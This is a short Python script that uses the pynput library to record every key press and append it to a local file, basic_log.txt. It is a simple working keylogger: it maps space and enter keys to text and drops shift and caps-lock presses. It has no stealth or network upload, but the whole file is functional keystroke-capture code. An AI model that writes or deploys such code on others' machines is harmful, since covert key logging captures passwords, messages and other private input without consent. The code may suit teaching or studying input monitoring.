# pynput --> Library to handle input streams

from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")
    #print(letter)

    if letter == "Key.space":
        letter = ' '

    elif letter == "Key.enter":
        letter = "\n"
    
    elif letter == "Key.caps_lock":
        letter = ''

    elif letter == "Key.shift_r":
        letter = ''
    
    elif letter == "Key.shift_l":
        letter = ''

    with open("basic_log.txt","a") as f:
        f.write(letter)

with Listener(on_press = write_to_file) as lis:
    lis.join()